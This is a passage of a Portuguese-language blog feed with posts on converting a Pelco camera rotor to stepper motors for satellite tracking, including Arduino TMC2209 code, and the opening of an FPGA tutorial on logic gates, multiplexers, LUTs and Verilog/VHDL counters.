  <span class="n">driver</span><span class="p">.</span><span class="n">rms_current</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>       <span class="c1">// Set motor RMS current</span>
  <span class="n">driver</span><span class="p">.</span><span class="n">microsteps</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>           <span class="c1">// Set microsteps to 1/16th</span>

  <span class="n">driver</span><span class="p">.</span><span class="n">en_spreadCycle</span><span class="p">(</span><span class="nb">false</span><span class="p">);</span>    <span class="c1">// Toggle spreadCycle on TMC2208/2209/2224</span>
  <span class="n">driver</span><span class="p">.</span><span class="n">pwm_autoscale</span><span class="p">(</span><span class="nb">true</span><span class="p">);</span>      <span class="c1">// Needed for stealthChop</span>

  <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"OK"</span><span class="p">);</span>
  <span class="n">digitalWrite</span><span class="p">(</span><span class="n">EN_PIN</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">bool</span> <span class="n">shaft</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">loop</span><span class="p">()</span> <span class="p">{</span>
<span class="c1">//  Serial.println("TURN");</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">Serial</span><span class="p">.</span><span class="n">available</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">z</span> <span class="o">=</span> <span class="n">Serial</span><span class="p">.</span><span class="n">read</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">z</span> <span class="o">==</span> <span class="sc">'a'</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"Stepping 10000"</span><span class="p">);</span>
      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">EN_PIN</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
      <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">10000</span><span class="p">;</span> <span class="n">i</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">STEP_PIN</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="n">delayMicroseconds</span><span class="p">(</span><span class="mi">350</span><span class="p">);</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">STEP_PIN</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
        <span class="n">delayMicroseconds</span><span class="p">(</span><span class="mi">350</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">digitalWrite</span><span class="p">(</span><span class="n">EN_PIN</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="nf">if</span> <span class="p">(</span><span class="n">z</span> <span class="o">==</span> <span class="sc">'b'</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">shaft</span> <span class="o">=</span> <span class="o">!</span><span class="n">shaft</span><span class="p">;</span>
      <span class="n">Serial</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">"Shaft direction: "</span><span class="p">);</span>
      <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="n">shaft</span><span class="p">);</span>
      <span class="n">driver</span><span class="p">.</span><span class="n">shaft</span><span class="p">(</span><span class="n">shaft</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Os resultados foram:</p>

<ul>
  <li>Eixo Eleva√ß√£o
    <ul>
      <li>Redu√ß√£o aproximada: 1:3500</li>
      <li>Resolu√ß√£o Angular: 0,000117 graus / passo</li>
      <li>Velocidade M√°xima: 0,62 graus / segundo</li>
    </ul>
  </li>
  <li>Eixo Azimute
    <ul>
      <li>Redu√ß√£o aproximada: 1:392</li>
      <li>Resolu√ß√£o Angular: 0,0046 graus / passo</li>
      <li>Velocidade M√°xima: 6,3 graus / segundo</li>
    </ul>
  </li>
</ul>

<p>Os resultados parecem bem promissores, e caso tudo d√™ certo, ser√° suficiente para rastreamento de sat√©lites!</p>

<p>O pr√≥ximo passo ser√° montar o software e o hardware para controlar via rede!</p>

<p>Os modelos 3D (tanto Freecad quanto STL) est√£o dispon√≠veis no Thingverse (ver se√ß√£o de links)</p>

<h2 id="links">Links</h2>

<ul>
  <li><a href="https://s.click.aliexpress.com/e/_AOhCSe">Motor para Azimute</a></li>
  <li><a href="https://s.click.aliexpress.com/e/_ADtVZs">Motor para Eleva√ß√£o (Closed-Loop)</a></li>
  <li><a href="https://s.click.aliexpress.com/e/_9zgziK">Motor para Eleva√ß√£o (Normal)</a></li>
  <li><a href="https://s.click.aliexpress.com/e/_AoG3ZC">Drivers TMC2209</a></li>
  <li><a href="https://www.thingiverse.com/thing:4813288">Arquivos STL / Freecad</a></li>
</ul>]]></content><author><name>Lucas Teske</name></author><category term="Reverse Engineering" /><category term="Satellite" /><category term="SDR" /><category term="Airspy" /><category term="EMWIN" /><category term="GOES" /><category term="Hearsat" /><category term="LRIT" /><category term="RE" /><category term="Reverse Engineering" /><category term="Sat" /><category term="Satellite" /><category term="SDR" /><summary type="html"><![CDATA[Continuando o projeto do tracker, consegui alguns progressos significativos. Assim como o Demilson (PY2UEP) tinha cortado os motores originais, fiz o mesmo. O motor do azimute estava bem enferrujado e acabei estragando uma de suas bobinas (queria reaproveitar o fio), mas no fim o eixo saiu.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/tracker-mount-2/assembled-elevation-shaft.jpg" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/tracker-mount-2/assembled-elevation-shaft.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Rotor de Antena - Parte 1</title><link href="https://lucasteske.dev/2021/03/rotor-antenna-parte-1" rel="alternate" type="text/html" title="Rotor de Antena - Parte 1" /><published>2021-03-03T23:57:00+00:00</published><updated>2021-03-03T23:57:00+00:00</updated><id>https://lucasteske.dev/2021/03/rotor-antenna-parte-1</id><content type="html" xml:base="https://lucasteske.dev/2021/03/rotor-antenna-parte-1"><![CDATA[<p>A uns anos atr√°s eu comprei um rotor para c√¢mera da Pelco, modelo PT175-24P. Esse rotor √© feito para carregar uma c√¢mera com lente de at√© 8kg, e cont√©m dois motores bif√°sicos reversiveis internamente. Minha ideia era (e √©) colocar uma parab√≥lica acoplada, e controlar seu movimento para rastrear sat√©lites. Assim eu poderia executar a recep√ß√£o de sat√©lites de baixa √≥rbita.</p>

<p><img src="/assets/posts/tracker-mount/motor-schematic.jpg" alt="Esquema Interno" /><em>Esquema Interno</em></p>

<hr />

<p>O problema do sistema original da pelco, √© que s√£o dois motores de 24V AC, o que torna um VFD (Variable Frequency Driver) nescess√°rio para controlar a velocidade e um sistema de loop fechado com algum sensor de angulo. Isso torna um pouco complexo o controle preciso da antena, ent√£o um colega (PY2UEP) sugeriu fazer uma modifica√ß√£o para trocar os motores por motor de passo. A grande vantagem dos motores de passo √© que seus passos s√£o sempre de mesmo comprimento. Logo se o motor der N passos em um sentido, e N passos no sentido contr√°rio, ele ir√° retornar <strong>exatamente</strong> a mesma posi√ß√£o. Isso permite o uso de circuitos abertos (onde apenas no come√ßo voc√™ move tudo para a posicao de referencia, e depois voc√™ n√£o usa o feedback para corrigir nada).</p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-03_20-56-30.jpg" alt="Motor de Passo" /><em>Motor de Passo</em></p>

<h1 id="fazendo-a-limpeza">Fazendo a limpeza</h1>

<p>Comecei ent√£o por abrir o rotor e fazer uma super limpeza. Limpar toda graxa antiga e tudo mais.</p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-02_20-19-46.jpg" alt="Interior da Pelco" /><em>Interior da Pelco</em>
<img src="/assets/posts/tracker-mount/photo_2021-03-02_20-19-46-2.jpg" alt="Interior da Pelco" /><em>Interior da Pelco</em></p>

<p>Desmontei tudo, e dei um belo banho de querosene para remover a graxa. Os dois rolamentos do azimute estavam bem travados (a graxa secou tanto que parecia cola) ent√£o deixei de um dia pro outro na querosene e depois limpei com um pincel. Ap√≥s toda limpeza, os rolamentos parecem novos!</p>

<p><img src="https://www.youtube.com/watch?v=9Y2FpSlNss8" alt="" /></p>

<p>O resto das pe√ßas eu joguei praticamente tudo dentro de um balde e enchi de querosene com um pouco de √°gua. Depois fiquei mexendo as pe√ßas dentro (como s√£o todas de metal bem resistente) ‚Äúgirando‚Äù o balde, como se eu estivesse misturando com uma colher. Ap√≥s um tempo assim, deixei um tempo decantar e depois fiz varias lavagens com √°gua e detergente pra remover toda querosene.</p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-03_19-23-52.jpg" alt="Balde com pe√ßas" /><em>Balde com pe√ßas lavadas</em></p>

<p>As correias eu tamb√©m deixei de molho na querosene e depois usei um pincel para tirar os peda√ßos encrustrados de graxa.</p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-03_19-23-53.jpg" alt="Correias" /><em>Correias na querosene</em></p>

<p>Ap√≥s tudo limpo, comecei a montagem colocando os dois rolamentos do azimute no lugar. O da parte inferior √© preso no interior da pessa sob press√£o, por isso foi nescess√°rio o uso de um martelo. Com cuidado e um guia fui empurrando a pe√ßa at√© ficar praticamente rente com a parte de baixo. Ap√≥s isso fiz a montagem do suporte do azimute.</p>

<p><img src="https://www.youtube.com/watch?v=5wpSKRn5RnM" alt="" /></p>

<p>E logo ap√≥s coloquei o redutor e a correia do azimute no lugar.</p>

<p><img src="https://www.youtube.com/watch?v=bE6B3GejGmA" alt="" /></p>

<p>Depois foram coisas mais faceis: parafusar tudo novamente. No fim, eu deixei aberto para que pudesse planejar os motores de passo:</p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-03_22-51-36.jpg" alt="Montagem da Pelco Aberta" /><em>Montagem da Pelco aberta</em></p>

<p>Pr√≥ximo passo √© desmontar os motores originais para adaptar o eixo aos motores de passo!</p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-03_22-56-26-2.jpg" alt="Motor do Azimute" /><em>Motor do Azimute</em></p>

<p><img src="/assets/posts/tracker-mount/photo_2021-03-03_22-56-26.jpg" alt="Motor da Eleva√ß√£o" /><em>Motor da Eleva√ß√£o</em></p>]]></content><author><name>Lucas Teske</name></author><category term="Reverse Engineering" /><category term="Satellite" /><category term="SDR" /><category term="Airspy" /><category term="EMWIN" /><category term="GOES" /><category term="Hearsat" /><category term="LRIT" /><category term="RE" /><category term="Reverse Engineering" /><category term="Sat" /><category term="Satellite" /><category term="SDR" /><summary type="html"><![CDATA[A uns anos atr√°s eu comprei um rotor para c√¢mera da Pelco, modelo PT175-24P. Esse rotor √© feito para carregar uma c√¢mera com lente de at√© 8kg, e cont√©m dois motores bif√°sicos reversiveis internamente. Minha ideia era (e √©) colocar uma parab√≥lica acoplada, e controlar seu movimento para rastrear sat√©lites. Assim eu poderia executar a recep√ß√£o de sat√©lites de baixa √≥rbita.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/tracker-mount/head.jpg" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/tracker-mount/head.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Introdu√ß√£o a FPGA</title><link href="https://lucasteske.dev/2020/10/introducao-a-fpga" rel="alternate" type="text/html" title="Introdu√ß√£o a FPGA" /><published>2020-10-12T02:59:00+00:00</published><updated>2020-10-12T02:59:00+00:00</updated><id>https://lucasteske.dev/2020/10/introducao-a-fpga</id><content type="html" xml:base="https://lucasteske.dev/2020/10/introducao-a-fpga"><![CDATA[<p>Esta √© a primeira parte do guia de programa√ß√£o para FPGAs! Este guia ir√° virar eventualmente um <code class="language-plaintext highlighter-rouge">verilog4noobs</code> para qualquer pessoa que quiser iniciar na √°rea de programa√ß√£o de hardware possa ter um jeito f√°cil de conseguir! Iremos come√ßar a explicar o que √© um FPGA e como ele funciona.</p>

<p>Para quem preferir, este artigo foi feito em base na Livestream sobre Verilog que fiz a um tempo atr√°s e est√° dispon√≠vel no YouTube: <a href="https://www.youtube.com/watch?v=BcKwqju5gxA">https://www.youtube.com/watch?v=BcKwqju5gxA</a></p>

<h1 id="o-que-√©-um-fpga">O que √© um FPGA</h1>

<p>FPGA √© uma abreviatura para Field Programmable Gate Array, ou Matriz de Portas Program√°veis em Campo. O termo <code class="language-plaintext highlighter-rouge">campo</code> usado aqui se refere ao fato de que o chip pode ser programado ap√≥s sair da f√°brica. O termo <code class="language-plaintext highlighter-rouge">portas</code> se referem a portas l√≥gicas.</p>

<p>Alguns exemplos de portas l√≥gicas:</p>

<p><img src="/assets/posts/introducao_a_fpga/logic-gates.svg" alt="Portas L√≥gicas" /><em>Portas L√≥gicas - Remix de <a href="https://commons.wikimedia.org/wiki/File:Circuit_elements.svg">https://commons.wikimedia.org/wiki/File:Circuit_elements.svg</a></em></p>

<h2 id="portas-l√≥gicas">Portas L√≥gicas</h2>

<p>As portas l√≥gicas efetuam opera√ß√µes l√≥gicas entre bits, e podem ter <strong>N</strong> entradas e uma sa√≠da. O FPGA √© uma matriz de portas l√≥gicas as quais podem ser interligadas para gerar circuitos l√≥gicos equivalentes a qualquer chip desejado. Portas l√≥gicas s√£o blocos bem simples, e geralmente podem ser representados com poucos trans√≠stores. Por exemplo, dado <code class="language-plaintext highlighter-rouge">A</code>, <code class="language-plaintext highlighter-rouge">B</code> entradas e <code class="language-plaintext highlighter-rouge">Q</code> sa√≠da. Podemos implementar portas NOT, NAND e NOR destas maneiras:</p>

<p><img src="/assets/posts/introducao_a_fpga/logic-not-transistor.svg" alt="Porta Inversora (NOT) em trans√≠stores" /><em>Representa√ß√£o em trans√≠stores bipolares de uma <strong>Porta Inversora</strong> (NOT)</em></p>

<p><img src="/assets/posts/introducao_a_fpga/logic-nand-transistor.svg" alt="Porta N√£o-E (NAND) em trans√≠stores" /><em>Representa√ß√£o em trans√≠stores bipolares de uma <strong>Porta N√£o-E</strong> (NAND)</em></p>

<p><img src="/assets/posts/introducao_a_fpga/logic-nor-transistor.svg" alt="Porta N√£o-OU (NOR) em trans√≠stores" /><em>Representa√ß√£o em trans√≠stores bipolares de uma <strong>Porta N√£o-OU</strong> (NOR)</em></p>

<p>As opera√ß√µes l√≥gicas realizadas pelas portas l√≥gicas descritas seguem a seguinte tabela da verdade:</p>

<div class="truth-table-holder">
  <div class="truth-table-container">
    <table id="andtable" class="truth">
      <tbody>
        <tr>
          <td colspan="4"><b>Porta E</b></td>
        </tr>
        <tr>
          <th>A</th>
          <th>B</th>
          <th class="dv"></th>
          <th>A &amp; B</th>
        </tr>
        <tr>
          <td>0</td>
          <td>0</td>
          <td class="dv"></td>
          <td class="mc">0</td>
        </tr>
        <tr>
          <td>0</td>
          <td>1</td>
          <td class="dv"></td>
          <td class="mc">0</td>
        </tr>
        <tr>
          <td>1</td>
          <td>0</td>
          <td class="dv"></td>
          <td class="mc">0</td>
        </tr>
        <tr>
          <td>1</td>
          <td>1</td>
          <td class="dv"></td>
          <td class="mc">1</td>
        </tr>
      </tbody>
    </table>
  </div>
  <div class="truth-table-container">
    <table id="ortable" class="truth">
      <tbody>
        <tr>
          <td colspan="4"><b>Porta OU</b></td>
        </tr>
        <tr>
          <th>A</th>
          <th>B</th>
          <th class="dv"></th>
          <th>A | B</th>
        </tr>
        <tr>
          <td>0</td>
          <td>0</td>
          <td class="dv"></td>
          <td class="mc">0</td>
        </tr>
        <tr>
          <td>0</td>
          <td>1</td>
          <td class="dv"></td>
          <td class="mc">1</td>
        </tr>
        <tr>
          <td>1</td>
          <td>0</td>
          <td class="dv"></td>
          <td class="mc">1</td>
        </tr>
        <tr>
          <td>1</td>
          <td>1</td>
          <td class="dv"></td>
          <td class="mc">1</td>
        </tr>
      </tbody>
    </table>
  </div>
  <div class="truth-table-container">
    <table id="nottable" class="truth">
      <tbody>
        <tr>
          <td colspan="3"><b>Porta Inversora</b></td>
        </tr>
        <tr>
          <th>A</th>
          <th class="dv"></th>
          <th>~A</th>
        </tr>
        <tr>
          <td>0</td>
          <td class="dv"></td>
          <td class="mc">1</td>
        </tr>
        <tr>
          <td>1</td>
          <td class="dv"></td>
          <td class="mc">0</td>
        </tr>
      </tbody>
    </table>
  </div>
</div>
<p><br /></p>

<p>Por√©m voc√™ nunca sabe especificamente qual porta ir√° usar em qual posi√ß√£o do FPGA. Por essa d√∫vida, seria nescess√°rio cada <code class="language-plaintext highlighter-rouge">bloco</code> do FPGA conter todos os tipos b√°sicos de portas l√≥gicas para que na hora de ligar, pudesse escolher a porta correta. Isso tornaria o chip ineficiente pois de N portas que um bloco teria, voc√™ apenas usaria uma.</p>

<p>Felizmente o FPGA n√£o usa portas l√≥gicas na sua maneira primitiva. Ao inv√©s disso ele usa uma ‚Äúporta program√°vel‚Äù feita com um circuito l√≥gico chamado <strong>multiplexador</strong>.</p>

<h2 id="o-que-√©-um-multiplexador">O que √© um Multiplexador</h2>

<p>Um multiplexador √© uma unidade l√≥gica de N entradas com apenas uma sa√≠da, e log2(N) entradas de controle. Abaixo segue um exemplo de um multiplexador de 8 entradas.</p>

<p><img src="/assets/posts/introducao_a_fpga/mux.svg" alt="Multiplexador 8 entradas" />*</p>

<p>Neste multiplexador temos:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">X0-X7</code>   =&gt; Entrada de dados</li>
  <li><code class="language-plaintext highlighter-rouge">A, B, C</code> =&gt; Entrada de controle</li>
  <li><code class="language-plaintext highlighter-rouge">O</code>       =&gt; Sa√≠da</li>
</ul>

<p>As entradas A, B e C formam um n√∫mero de 3 bits que representam qual entrada X estar√° ligada a sa√≠da O.
<br /></p>

<div class="truth-table-container">
  <table id="muxtable" class="truth">
    <tbody>
      <tr>
        <td colspan="5"><b>MUX8</b></td>
      </tr>
      <tr>
        <th>A</th>
        <th>B</th>
        <th>C</th>
        <th class="dv"></th>
        <th>O</th>
      </tr>
      <tr>
        <td>0</td>
        <td>0</td>
        <td>0</td>
        <td class="dv"></td>
        <td class="mc">X0</td>
      </tr>
      <tr>
        <td>0</td>
        <td>0</td>
        <td>1</td>
        <td class="dv"></td>
        <td class="mc">X1</td>
      </tr>
      <tr>
        <td>0</td>
        <td>1</td>
        <td>0</td>
        <td class="dv"></td>
        <td class="mc">X2</td>
      </tr>
      <tr>
        <td>0</td>
        <td>1</td>
        <td>1</td>
        <td class="dv"></td>
        <td class="mc">X3</td>
      </tr>
      <tr>
        <td>1</td>
        <td>0</td>
        <td>0</td>
        <td class="dv"></td>
        <td class="mc">X4</td>
      </tr>
      <tr>
        <td>1</td>
        <td>0</td>
        <td>1</td>
        <td class="dv"></td>
        <td class="mc">X5</td>
      </tr>
      <tr>
        <td>1</td>
        <td>1</td>
        <td>0</td>
        <td class="dv"></td>
        <td class="mc">X6</td>
      </tr>
      <tr>
        <td>1</td>
        <td>1</td>
        <td>1</td>
        <td class="dv"></td>
        <td class="mc">X7</td>
      </tr>
    </tbody>
  </table>
</div>

<p>Com a sua contra-parte (demultiplexador ou demux), √© poss√≠vel transferir v√°rios canais de dados em apenas um canal, desde que ambos Mux e Demux estejam com os valores A,B,C corretamente configurados. Por√©m para FPGA‚Äôs MUX geralmente s√£o usados de maneiras diferentes. Em l√≥gica digital, voc√™ pode usar um MUX para implementar <em>qualquer</em> porta l√≥gica associando as entradas do mux a valores pr√©-definidos.</p>

<h2 id="implementando-portas-l√≥gicas-com-multiplexador">Implementando portas l√≥gicas com Multiplexador</h2>

<p>A implementa√ß√£o de portas l√≥gicas pode parecer complexa, mas para portas simples (NOT, OR, AND) √© bem simples de entender o funcionamento. Vamos usar um MUX de 2 entradas (1 bit).</p>

<p><img src="/assets/posts/introducao_a_fpga/mux2.svg" alt="Multiplexador 2 entradas" />*</p>

<p>Neste caso a tabela da verdade √© bem mais simples:</p>

<div class="truth-table-container">
  <table id="mux2table" class="truth">
    <tbody>
      <tr>
        <td colspan="4"><b>MUX2</b></td>
      </tr>
      <tr>
        <th>A</th>
        <th class="dv"></th>
        <th>O</th>
      </tr>
      <tr>
        <td>0</td>
        <td class="dv"></td>
        <td class="mc">X0</td>
      </tr>
      <tr>
        <td>1</td>
        <td class="dv"></td>
        <td class="mc">X1</td>
      </tr>
    </tbody>
  </table>
</div>
<p><br /></p>

<p>De modo que se quisermos que o MUX2 vire uma porta inversora, podemos apenas pr√©-configurar as entradas X0 e X1 com os valores 1 e 0.</p>

<div class="truth-table-container">
  <table id="mux2table" class="truth">
    <tbody>
      <tr>
        <td colspan="6"><b>MUX2-NOT</b></td>
      </tr>
      <tr>
        <th>X0</th>
        <th>X1</th>
        <th>A</th>
        <th class="dv"></th>
        <th>O porta</th>
        <th>O valor</th>
      </tr>
      <tr>
        <td>1</td>
        <td>0</td>
        <td class="tv">0</td>
        <td class="dv"></td>
        <td class="mc">X0</td>
        <td class="mc">1</td>
      </tr>
      <tr>
        <td>1</td>
        <td>0</td>
        <td class="tv">1</td>
        <td class="dv"></td>
        <td class="mc">X1</td>
        <td class="mc">0</td>
      </tr>
    </tbody>
  </table>
</div>
<p><br /></p>

<p>Caso queiramos fazer uma porta AND, podemos configurar a entrada X0 como 0, e usar a entrada X1 e A como entradas da porta AND</p>

<div class="truth-table-container">
  <table id="mux2table" class="truth">
    <tbody>
      <tr>
        <td colspan="6"><b>MUX2-AND</b></td>
      </tr>
      <tr>
        <th>X0 (FIXO)</th>
        <th>X1 (AND0)</th>
        <th>A (AND1)</th>
        <th class="dv"></th>
        <th>O porta</th>
        <th>O valor</th>
      </tr>
      <tr>
        <td>0</td>
        <td class="tv">0</td>
        <td class="tv">0</td>
        <td class="dv"></td>
        <td class="mc">X0</td>
        <td class="mc">0</td>
      </tr>
      <tr>
        <td>0</td>
        <td class="tv">0</td>
        <td class="tv">1</td>
        <td class="dv"></td>
        <td class="mc">X1</td>
        <td class="mc">0</td>
      </tr>
      <tr>
        <td>0</td>
        <td class="tv">1</td>
        <td class="tv">0</td>
        <td class="dv"></td>
        <td class="mc">X0</td>
        <td class="mc">0</td>
      </tr>
      <tr>
        <td>0</td>
        <td class="tv">1</td>
        <td class="tv">1</td>
        <td class="dv"></td>
        <td class="mc">X1</td>
        <td class="mc">1</td>
      </tr>
    </tbody>
  </table>
</div>
<p><br /></p>

<p>Ou no caso de uma porta OR, fixamos o valor de X1 em 1 e usamos X0 e A como operadores OR.</p>

<div class="truth-table-container">
  <table id="mux2table" class="truth">
    <tbody>
      <tr>
        <td colspan="6"><b>MUX2-OR</b></td>
      </tr>
      <tr>
        <th>X0 (OR0)</th>
        <th>X1 (FIXO)</th>
        <th>A (OR1)</th>
        <th class="dv"></th>
        <th>O porta</th>
        <th>O valor</th>
      </tr>
      <tr>
        <td class="tv">0</td>
        <td>1</td>
        <td class="tv">0</td>
        <td class="dv"></td>
        <td class="mc">X0</td>
        <td class="mc">0</td>
      </tr>
      <tr>
        <td class="tv">0</td>
        <td>1</td>
        <td class="tv">1</td>
        <td class="dv"></td>
        <td class="mc">X1</td>
        <td class="mc">1</td>
      </tr>
      <tr>
        <td class="tv">1</td>
        <td>1</td>
        <td class="tv">0</td>
        <td class="dv"></td>
        <td class="mc">X0</td>
        <td class="mc">1</td>
      </tr>
      <tr>
        <td class="tv">1</td>
        <td>1</td>
        <td class="tv">1</td>
        <td class="dv"></td>
        <td class="mc">X1</td>
        <td class="mc">1</td>
      </tr>
    </tbody>
  </table>
</div>
<p><br /></p>

<p>Existem outras opera√ß√µes que podem ser implementadas usando multiplexadores, inclusive opera√ß√µes mais complexas caso o multiplexador tenha mais entradas. Este uso √© frequentemente chamado de Lookup-Table (ou Tabela de Consulta em portugu√™s). Os detalhes de como criar opera√ß√µes n√£o ser√£o discutidos aqui (por√©m se quiserem, posso fazer um artigo no futuro sobre :) ), mas com essas informa√ß√µes j√° conseguimos explicar como funciona as c√©lulas do FPGA!</p>

<h2 id="lut-lookup-table-dos-fpgas">‚ÄúLUT‚Äù Lookup-Table dos FPGAs</h2>

<p>Cada c√©lula do FPGA cont√©m (em geral) uma LUT (Lookup-Table), um Flip-Flop tipo D e um mux 2:1.</p>

<p><img src="/assets/posts/introducao_a_fpga/fpga-logic-cell.svg" alt="C√©lula L√≥gica do FPGA" /><em>C√©lula L√≥gica do FPGA</em></p>

<p>O flip-flop serve para sincroniza√ß√£o dos dados quando a opera√ß√£o √© feita sob um dom√≠nio de um clock (um sinal de sincronia). J√° o MUX 2:1 serve para selecionar se aquela c√©lula ser√° sincronizada com algo ou n√£o (ela alterna entre a sa√≠da do flip-flop e a sa√≠da direto da LUT).</p>

<p>As LUT‚Äôs seguem o princ√≠pio da reprogramabilidade do multiplexador como foi comentado na se√ß√£o anterior, onde cada uma das entradas pode estar ligada a um n√≠vel l√≥gico fixo ( 0 ou 1 ) ou a outras c√©lulas / Pinos de entrada. Cada c√©lula independente pode n√£o fazer muita coisa por s√≠, por√©m interligadas a outras c√©lulas podem fazer praticamente qualquer coisa!</p>

<h1 id="o-que-√©-uma-hdl">O que √© uma HDL</h1>

<p>HDL significa Hardware Description Language (ou Linguagem de Descri√ß√£o de Hardware). Uma HDL serve para abstrair os conceitos de portas l√≥gicas e c√©lulas do FPGA para um n√≠vel onde fique mais f√°cil de pensar na l√≥gica do programa. Uma HDL √© efetivamente traduzida a netlist (lista de n√≥s) de pseudo-LUTs que ser√° usada para preparar o conjunto de dados que ir√° efetivamente ligar as c√©lulas dentro do FPGA.</p>

<p>As duas linguagens mais tradicionais s√£o VHDL e Verilog. Ambas s√£o suportadas pela grande maioria de ferramentas de FPGA especificas dos fabricantes e tamb√©m das de c√≥digo fonte aberto.</p>

<div class="language-verilog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Exemplo em Verilog</span>
<span class="k">module</span> <span class="n">contador</span> <span class="p">(</span> <span class="c1">// Defini√ß√£o de entradas e sa√≠das do m√≥dulo</span>
  <span class="n">out</span>     <span class="p">,</span>  <span class="c1">// Sa√≠da do contador</span>
  <span class="n">enable</span>  <span class="p">,</span>  <span class="c1">// Sinal de ativa√ß√£o do contador</span>
  <span class="n">clk</span>     <span class="p">,</span>  <span class="c1">// Sinal de clock</span>
  <span class="n">reset</span>      <span class="c1">// Sinal de reset</span>
<span class="p">);</span>
<span class="c1">// ------------- Portas de sa√≠da ----------</span>
    <span class="kt">output</span> <span class="p">[</span><span class="mi">7</span><span class="o">:</span><span class="mi">0</span><span class="p">]</span> <span class="n">out</span><span class="p">;</span> <span class="c1">// Sa√≠da de 8 bits</span>
<span class="c1">// ------------ Portas de Entrada ---------</span>
    <span class="kt">input</span> <span class="n">enable</span><span class="p">,</span> <span class="n">clk</span><span class="p">,</span> <span class="n">reset</span><span class="p">;</span>
<span class="c1">// ------------ Vari√°veis Internas --------</span>
    <span class="kt">reg</span> <span class="p">[</span><span class="mi">7</span><span class="o">:</span><span class="mi">0</span><span class="p">]</span> <span class="n">out</span><span class="p">;</span> <span class="c1">// Contador de 8 bits, associado a sa√≠da out</span>

<span class="c1">// ------------- C√≥digo come√ßa aqui -------</span>

<span class="k">always</span> <span class="o">@</span><span class="p">(</span><span class="kt">posedge</span> <span class="n">clk</span><span class="p">)</span>
<span class="k">if</span> <span class="p">(</span><span class="n">reset</span><span class="p">)</span> <span class="k">begin</span>
  <span class="n">out</span> <span class="o">&lt;=</span> <span class="mb">8'b0</span> <span class="p">;</span>
<span class="k">end</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">enable</span><span class="p">)</span> <span class="k">begin</span>
  <span class="n">out</span> <span class="o">&lt;=</span> <span class="n">out</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
<span class="k">end</span>

<span class="k">endmodule</span>
</code></pre></div></div>

<div class="language-vhdl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- Exemplo em VHDL</span>
<span class="k">library</span> <span class="n">ieee</span><span class="p">;</span>
  <span class="k">use</span> <span class="n">ieee</span><span class="o">.</span><span class="n">std_logic_1164</span><span class="o">.</span><span class="k">all</span><span class="p">;</span>
  <span class="k">use</span> <span class="n">ieee</span><span class="o">.</span><span class="n">std_logic_unsigned</span><span class="o">.</span><span class="k">all</span><span class="p">;</span>

<span class="c1">-- Defini√ß√£o de entradas e sa√≠das do m√≥dulo</span>
<span class="k">entity</span> <span class="n">contador</span> <span class="k">is</span>
  <span class="k">port</span> <span class="p">(</span>
    <span class="n">cout</span>   <span class="p">:</span><span class="k">out</span> <span class="kt">std_logic_vector</span> <span class="p">(</span><span class="mi">7</span> <span class="k">downto</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">-- Sa√≠da de 8 bits do contador</span>
    <span class="n">enable</span> <span class="p">:</span><span class="k">in</span>  <span class="kt">std_logic</span><span class="p">;</span>                     <span class="c1">-- Sinal de ativa√ß√£o do contador</span>
    <span class="n">clk</span>    <span class="p">:</span><span class="k">in</span>  <span class="kt">std_logic</span><span class="p">;</span>                     <span class="c1">-- Sinal de clock</span>
    <span class="n">reset</span>  <span class="p">:</span><span class="k">in</span>  <span class="kt">std_logic</span>                      <span class="c1">-- Sinal de reset</span>
  <span class="p">);</span>
<span class="k">end</span> <span class="k">entity</span><span class="p">;</span>

<span class="c1">-- Defini√ß√£o do funcionamento do m√≥dulo</span>
<span class="k">architecture</span> <span class="n">rtl</span> <span class="k">of</span> <span class="n">contador</span> <span class="k">is</span>
